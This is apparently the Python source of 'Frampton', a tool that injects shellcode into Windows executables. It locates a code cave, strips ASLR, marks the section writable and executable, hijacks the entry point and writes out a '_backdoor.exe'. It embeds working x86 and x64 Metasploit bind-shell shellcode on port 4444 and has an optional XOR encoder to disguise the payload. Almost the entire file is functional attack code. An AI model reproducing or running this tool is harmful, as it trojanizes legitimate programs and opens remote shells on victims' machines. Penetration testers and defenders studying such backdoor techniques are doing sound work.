#!/usr/bin/env python3

import sys
import os
import pefile
import argparse
from colorama import Fore,Style
from itertools import cycle

# CLI Argument Inputs
parser = argparse.ArgumentParser(description='Frampton PE file Injector')
parser.add_argument('--file','-f',
                    help='Filename or path to base template PE file',
                    required=True,
                    dest='file')
parser.add_argument('--shellcode','-s',
                    required=False,
                    dest='shellcode',
                    type=str,
                    help='Enter custom shellcode - architecture specific x86/x64 (optional) - Default: Windows x86 TCP 4444 Bind Shell')
parser.add_argument('--output','-o',
                    help='Filename or path to new destination PE file (optional)',
                    required=False,
                    dest='outfile')
parser.add_argument('--info','-i',
                    help='Only display code cave information - does not inject or modify (optional)',
                    action="store_true",
                    default=False,
                    required=False,
                    dest='info')
parser.add_argument('--encoder','-e',
                    help='Use built-in shellcode XOR encoder - x86 only (optional)',
                    action="store_true",
                    default=False,
                    required=False,
                    dest='encoder')
parser.add_argument('--multi-encoder','-m',
                    help='Specify the number of auto-generated keys to encode shellcode (optional)',
                    type=int,
                    default=False,
                    required=False,
                    dest='encodermultiple')
args = parser.parse_args()

# Colour Function Defintions
def PrintGreen(text):
    return (Fore.GREEN + Style.BRIGHT + text + Style.NORMAL + Fore.WHITE)

def PrintBlue(text):
    return (Fore.BLUE + Style.BRIGHT + text + Style.NORMAL + Fore.WHITE)

def PrintRed(text):
    return (Fore.RED + Style.BRIGHT + text + Style.NORMAL + Fore.WHITE)

def xor(data, key):
    return bytes([_a ^ _b for _a, _b in zip(data, cycle(key))])

# ASLR Status Checker / Disabler
def AslrStatus():

    global pe

    # ASLR Check
    dynamicBase = 0x40
    aslrcheck = pe.OPTIONAL_HEADER.DllCharacteristics & 0x0040

    # If ASLR is enabled, then disable it and save to new file
    if aslrcheck:
        if (args.info == False):
            print (PrintRed("[!]") + " ASLR: \t\t\tEnabled - Disabling ASLR to " + newFile + "\n")
            pe.OPTIONAL_HEADER.DllCharacteristics &= ~dynamicBase
            pe.write(newFile)
            return True
        else:
            print(PrintRed("[!]") + " ASLR: \t\t\tEnabled\n")
        #sys.exit(1)

    # Continue without ASLR
    else:
        print (PrintGreen("[+]") + " ASLR: \t\t\tDisabled\n")
        return False

# Identifies code cave of specified size (min shellcode + 20 padding)
# Returns the Virtual and Raw addresses
def FindCave():

    global aslr
    global pe
    global x64

    # ASLR Check
    aslr = AslrStatus()

    # If ASLR was enabled, open the new file for working
    if aslr:
        filedata = open(newFile, "rb")
        pe = pefile.PE(newFile)

    else:
        filedata = open(file, "rb")

    print(PrintBlue("[i]") + " Min Cave Size: \t\t" + str(4 + len(shellcode)) + " bytes")

    # Set PE file Image Base
    image_base_hex = int('0x{:08x}'.format(pe.OPTIONAL_HEADER.ImageBase), 16)

    # Print Number of Section Headers
    print(PrintBlue("[i]") + " Number of Sections: \t" + str(pe.FILE_HEADER.NumberOfSections))

    caveFound = False

    # Loop through sections to identify code cave of minimum bytes
    for section in pe.sections:
        sectionCount = 0

        print(PrintBlue("[i]") + " Checking Section: \t\t" + section.Name.decode())

        if section.SizeOfRawData != 0:
            position = 0
            count = 0

            filedata.seek(section.PointerToRawData, 0)
            data = filedata.read(section.SizeOfRawData)

            for byte in data:
                position += 1

                if byte == 0x00:
                    count += 1
                else:

                    if count > minCave:
                        caveFound = True
                        raw_addr = section.PointerToRawData + position - count - 1
                        vir_addr = image_base_hex + section.VirtualAddress + position - count - 1

                        print(PrintGreen("[+]") + " Code Cave:")
                        print("\tSection: \t\t%s" % section.Name.decode())
                        print ("\tSize: \t\t\t%d bytes" % count)
                        print ("\tRaw: \t\t\t0x%08X" % raw_addr)
                        print ("\tVirtual: \t\t0x%08X" % vir_addr)
                        print("\tCharacteristics: \t" + hex(section.Characteristics))

                        if args.info is False:
                            # Set section header characteristics ## RWX
                            section.Characteristics = 0xE0000040
                            print("\tNew Characteristics: \t" + "0xE0000040\n")

                        return vir_addr, raw_addr

                    count = 0
        sectionCount += 1

    # if caveFound is False:
    #     print(PrintRed("[!]") + " No Viable Code Cave Found")

    filedata.close()


# Frampton banner
banner = (
  "\n"
  "_|_|_|_|                                             _|\n"
  "_|       _|  _|_|   _|_|_| _|_|_|  _|_|   _|_|_|   _|_|_|_|   _|_|   _|_|_|\n"
  "_|_|_|   _|_|     _|    _| _|    _|    _| _|    _|   _|     _|    _| _|    _|\n"
  "_|       _|       _|    _| _|    _|    _| _|    _|   _|     _|    _| _|    _|\n"
  "_|       _|         _|_|_| _|    _|    _| _|_|_|       _|_|   _|_|   _|    _|\n"
  "                                          _|\n"
  "                                          _|\n"
)
print(PrintGreen(banner))

# Load file to var
file = args.file

# Load to pefile object
pe = pefile.PE(file)

# Global var for ASLR tracking
aslr = False

# Global var for x64
x64 = False

shellcode64 = bytes (
b"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
b"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
b"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
b"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
b"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
b"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
b"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
b"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
b"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
b"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
b"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
b"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
b"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
b"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33"
b"\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00"
b"\x49\x89\xe5\x49\xbc\x02\x00\x11\x5c\x00\x00\x00\x00\x41\x54"
b"\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x4c"
b"\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b\x00\xff"
b"\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48\x89\xc2"
b"\x48\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf\xe0\xff\xd5\x48"
b"\x89\xc7\x6a\x10\x41\x58\x4c\x89\xe2\x48\x89\xf9\x41\xba\xc2"
b"\xdb\x37\x67\xff\xd5\x48\x31\xd2\x48\x89\xf9\x41\xba\xb7\xe9"
b"\x38\xff\xff\xd5\x4d\x31\xc0\x48\x31\xd2\x48\x89\xf9\x41\xba"
b"\x74\xec\x3b\xe1\xff\xd5\x48\x89\xf9\x48\x89\xc7\x41\xba\x75"
b"\x6e\x4d\x61\xff\xd5\x48\x81\xc4\xa0\x02\x00\x00\x49\xb8\x63"
b"\x6d\x64\x00\x00\x00\x00\x00\x41\x50\x41\x50\x48\x89\xe2\x57"
b"\x57\x57\x4d\x31\xc0\x6a\x0d\x59\x41\x50\xe2\xfc\x66\xc7\x44"
b"\x24\x54\x01\x01\x48\x8d\x44\x24\x18\xc6\x00\x68\x48\x89\xe6"
b"\x56\x50\x41\x50\x41\x50\x41\x50\x49\xff\xc0\x41\x50\x49\xff"
b"\xc8\x4d\x89\xc1\x4c\x89\xc1\x41\xba\x79\xcc\x3f\x86\xff\xd5"
b"\x48\x31\xd2\x48\xff\xca\x8b\x0e\x41\xba\x08\x87\x1d\x60\xff"
b"\xd5\xbb\xaa\xc5\xe2\x5d\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48"
b"\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13"
b"\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5"
)

# msfvenom -p windows/shell_bind_tcp LPORT=4444 EXITFUNC=none -b '\x00' -i 0 -f c
shellcode = bytes(
b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
b"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
b"\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"
b"\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
b"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"
b"\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"
b"\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"
b"\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
b"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb"
b"\x8d\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c"
b"\x77\x26\x07\xff\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68"
b"\x29\x80\x6b\x00\xff\xd5\x6a\x08\x59\x50\xe2\xfd\x40\x50\x40"
b"\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x68\x02\x00\x11\x5c\x89"
b"\xe6\x6a\x10\x56\x57\x68\xc2\xdb\x37\x67\xff\xd5\x57\x68\xb7"
b"\xe9\x38\xff\xff\xd5\x57\x68\x74\xec\x3b\xe1\xff\xd5\x57\x97"
b"\x68\x75\x6e\x4d\x61\xff\xd5\x68\x63\x6d\x64\x00\x89\xe3\x57"
b"\x57\x57\x31\xf6\x6a\x12\x59\x56\xe2\xfd\x66\xc7\x44\x24\x3c"
b"\x01\x01\x8d\x44\x24\x10\xc6\x00\x44\x54\x50\x56\x56\x56\x46"
b"\x56\x4e\x56\x56\x53\x56\x68\x79\xcc\x3f\x86\xff\xd5\x89\xe0"
b"\xff\x30\x68\x08\x87\x1d\x60\xff\xd5\xbb\xaa\xc5\xe2\x5d\x68"
b"\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05"
b"\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5"
)

# Custom shellcode
if args.shellcode:
    shellcode = bytearray([int(x, 16) for x in args.shellcode.split("\\x") if len(x)]) + b""
else:
    shellcode = shellcode

if args.outfile:
    newFile = args.outfile
else:
    newFile = args.file.split(".exe")[0] + "_backdoor.exe"

if args.info:
    print (PrintBlue("[i] INFO") + "\t\t\tNo Injection Configured")

print (PrintBlue("[i]") + " Filename: \t\t\t" + os.path.basename(file))

# Checks if 32 or 64 bit binary
if hex(pe.FILE_HEADER.Machine) == '0x14c':
    print(PrintGreen("[+]") + " Arch: \t\t\t32-bit")

else:
    print(PrintGreen("[+]") + " Arch: \t\t\t64-bit")
    if args.shellcode is False:
        shellcode = shellcode64

    x64 = True
    if (args.info):
        print(PrintRed("[!]") + " Backdoor not injected")

# Stores Image Base (e.g. 0x400000)
image_base = pe.OPTIONAL_HEADER.ImageBase
print(PrintBlue("[i]") + " Image Base:\t\t\t" + '0x{:08x}'.format(image_base))

# Stores entrypoint as 4 byte hex e.g. 0x0004777f)
entrypoint = '0x{:08x}'.format(pe.OPTIONAL_HEADER.AddressOfEntryPoint)
print(PrintBlue("[i]") + " Entry Point:\t\t" + entrypoint)

# Find Code Cave
if args.encoder:
    minCave = len(shellcode) + 25
else:
    minCave = len(shellcode) + 20

try:
    newEntryPoint, newRawOffset = FindCave()
except:
    sys.exit(PrintRed("[!]") + " No Code Cave Found")

# Stores original entrypoint
origEntryPoint = (pe.OPTIONAL_HEADER.AddressOfEntryPoint)

# Perform injection - Info not set
if args.info is False:

    if len(shellcode) < 10:
        sys.exit(PrintRed("[!]") + " Minimum shellcode size 10 bytes")

    # Sets new Entry Point and aligns address
    aslr_ep = newEntryPoint - image_base
    epAdjustedSize = 0

    if aslr_ep % 4 == 0:
        pe.OPTIONAL_HEADER.AddressOfEntryPoint = aslr_ep
    else:
        epAdjustedSize = (4 - (aslr_ep % 4))
        aslr_ep = (4 - (aslr_ep % 4)) + aslr_ep

        pe.OPTIONAL_HEADER.AddressOfEntryPoint = aslr_ep

    print(PrintBlue("[i]") + " New Entry Point:\t\t"  '0x{:08x}'.format(aslr_ep))

    # Reformat original instruction return address to little endian
    if x64:
        returnAddress = (origEntryPoint + image_base).to_bytes(8, 'little')
    else:
        returnAddress = (origEntryPoint + image_base).to_bytes(4, 'little')

    # XOR Encoding

    if args.encoder:

        print(PrintGreen("\n[+]") + " Shellcode Encoding:")

        encodedShellcode = shellcode
        encoderCount = 1

        if args.encodermultiple:
            encoderCount = args.encodermultiple
            if encoderCount > 4:
                encoderCount = 4

            xorInstructions = b""
            for x in range(encoderCount):
                encodingKey = os.urandom(1)
                xorInstructions += b"\x80\x30" + encodingKey

                print("\tXOR Key:\t\t\\x" + encodingKey.hex().upper())
                encodedShellcode = (xor(encodedShellcode, encodingKey))

            endDecodeAddress = newEntryPoint + int(hex(4 + len(shellcode)), 16) + int(
                hex((encoderCount - 1) * 3), 16)
            if x64:
                startDecodeAddress = (int(hex(newEntryPoint), 16) + int(hex(0x1b), 16) + ((encoderCount - 1) * 3))
            else:
                startDecodeAddress = (int(hex(newEntryPoint), 16) + int(hex(0x14), 16) + ((encoderCount - 1) * 3))
        else:
            encodingKey = os.urandom(1)  # b"\x2f"
            xorInstructions = b"\x80\x30" + encodingKey
            encodedShellcode = (xor(encodedShellcode, encodingKey))
            print ("\tXOR Key:\t\t\\x" + encodingKey.hex().upper())
            if x64:
                startDecodeAddress = (int(hex(newEntryPoint), 16) + int(hex(0x1b), 16))
            else:
                startDecodeAddress = (int(hex(newEntryPoint), 16) + int(hex(0x14), 16))

            endDecodeAddress = newEntryPoint + int(hex(4 + len(shellcode)), 16)
        if x64:
            endDecodeAddressLittle = (endDecodeAddress + 0x16).to_bytes(8, 'little')
        else:
            endDecodeAddressLittle = (endDecodeAddress + 15).to_bytes(4, 'little')


        print("\tStart address:\t\t" + (hex(int(hex(newEntryPoint), 16) + int(hex(0x1b), 16) + ((encoderCount - 1) * 3))))#hex(newEntryPoint))
        print("\tEnd Address:\t\t" + hex(endDecodeAddress))

        if x64:

            xorDecoder = b"\x48\xb8" + startDecodeAddress.to_bytes(8, 'little') # (int(hex(newEntryPoint), 16) + int(hex(0x1b), 16))
            xorDecoder += xorInstructions
            #xorDecoder += b"\x80\x30" + encodingKey
            xorDecoder += b"\x48\xFF\xC0"
            xorDecoder += b"\x3D" + endDecodeAddressLittle[:4]

            # JMP Short\xf3 default 1 key
            shortJmp = 0xf3
            shortJmp = shortJmp - (int(str((encoderCount - 1)  * 3), 16))
            xorDecoder += b"\x7e" + shortJmp.to_bytes(1, 'little') #"\xf3"

            shellcode = xorDecoder + encodedShellcode

        else:
            xorDecoder = b"\xB8" + startDecodeAddress.to_bytes(4, 'little') #(int(hex(newEntryPoint),16) + int(hex(0x14),16))
            xorDecoder += xorInstructions
            #xorDecoder += b"\x80\x30" + encodingKey
            xorDecoder += b"\x40"
            xorDecoder += b"\x3d" + endDecodeAddressLittle

            # JMP Short\xf5 default 1 key
            shortJmp = 0xf5
            shortJmp = shortJmp - (int(str(encoderCount - 1), 16) * 3)
            xorDecoder += b"\x7e" + shortJmp.to_bytes(1, 'little')
            shellcode = xorDecoder + encodedShellcode

    if x64:
        # Balance address to  %4 b

        # Add return address for original program execution
        # mov rax, addr
        # jmp rax
        shellcode += (b"\x48\xb8" + returnAddress)

        paddingBytes = b""
        if len(shellcode) % 4 != 0:
            paddingBytes = b"\x90" * epAdjustedSize
            shellcode += paddingBytes

        shellcode += (b"\xFF\xe0")

    else:
        # Add return address for original program execution
        # mov eax, addr
        # call eax
        shellcode += (b"\xB8" + returnAddress)

        paddingBytes = b""
        if len(shellcode) % 4 != 0:
            paddingBytes = b"\x90" * epAdjustedSize
            shellcode += paddingBytes

        shellcode += (b"\xFF\xD0")

    # Prepend 4 NOPS to shellcode for padding
    shellcode = b"\x90\x90\x90\x90" + shellcode

    # Injects Shellcode
    pe.set_bytes_at_offset(newRawOffset, shellcode)

    print (PrintGreen("\n[+]") + " New PE Saved:\t\t" + newFile)

    # Save and close files
    pe.write(newFile)

pe.close()
print("\n")
